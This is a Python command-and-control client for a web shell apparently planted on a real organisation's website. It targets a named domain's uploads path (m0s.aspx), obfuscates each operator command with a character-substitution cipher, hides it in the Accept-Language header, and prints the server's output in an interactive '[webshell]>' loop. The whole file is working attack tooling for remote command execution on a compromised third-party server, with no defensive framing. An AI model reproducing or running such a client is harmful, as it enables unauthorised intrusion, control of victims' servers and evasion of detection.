import requests,readline

def encode(input_string):
    # Define the original and replacement strings
    #en = rf"AB_CDEFG.HIJKLM!$%&*()?NOPQR-STUVWXYZabcdefghijklmnopqrstu=vwxyz0123456789/"
    #de = rf"Qk3\\afcPbYJTGywSv=0Egdx62X-NRVz!~$%_*()?Uq7os1ijFMuLOetCl98K5hBDn4.prWAHmIZ"
    en = rf"AB_CDEFG.HIJKLM!$%&*()?NOPQR-STUVWXYZabcdefghijklmnopqrstu=vwxyz0123456789/";
    de = rf"Qk3\afcPbYJTGywSv=0Egdx62X-NRVz!~$%_*()?Uq7os1ijFMuLOetCl98K5hBDn4.prWAHmIZ";
    # Create a translation table
    translation_table = str.maketrans(en, de)
    # Encode the input string using the translation table
    encoded_string = input_string.translate(translation_table)
    return encoded_string


def complete(self, text, state):
	if state == 0:
		if len(text) == 0:
			self.matches = [s for s in self.options.keys()]
		elif len(text) != 0:
			self.matches = [s for s in self.options.keys() if s and s.startswith(text)]
	try:
		return self.matches[state] + " "
	except IndexError:
		return None

readline.set_completer(complete)
readline.parse_and_bind('tab: complete')
readline.set_completer_delims('\n')

headers = {
"Accept-Captcha":"am=JgAAgP7jP38JwxmUgBgbuF8P_Nmlh2EEBhzhIQOBCEgGdAeWqYD_xNXr3UBFH35AAgACOJqOmhmdA2KVQwAEsGJYhhEAAAAAAAAAAA",
"Accept-Language" : "whoami",
"User-Agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
}

def show_help():
    print(" - %-15s %s " % ("help", "Displays this help message."))
    print(" - %-15s %s " % ("exit", "Exits the script."))
    return

def remote_exec(target, cmd):
    headers["Accept-Language"] = cmd
    try:
        r = requests.get(target,headers=headers)
        if r.status_code == 200:
            data = r.text
        else:
            print(r.text)
            return
    except Exception as e:
        print(e)
        return
    try:
        dataq = data.split('\n')[:-1]
    except:
        print(dataq)
        return
    for x in dataq:
	    print(x)

while True:
	print('select your Target')
	print('1. jordandesert.org.jo')
	print('0. exit')
	print('--------------------')
	while True:
		userinput = int(input(' ------ > ').strip())
		if userinput == 0:
			print('good bye commonder !')
			exit()
		elif userinput == 1:
			TargetURL = "http://www.jordandesert.org.jo/CMS/Uploads/m0s.aspx"
			break
		else:
			print('wrong input')

	runingshell = True
	while runingshell:
		cmd = input("[webshell]> ").strip()
		args = cmd.lower().split(" ")
		if args[0] == "exit":
			runingshell = False
		elif args[0] == "help":
			show_help()
		else:
			cmd = encode(cmd)
			remote_exec(TargetURL, cmd)
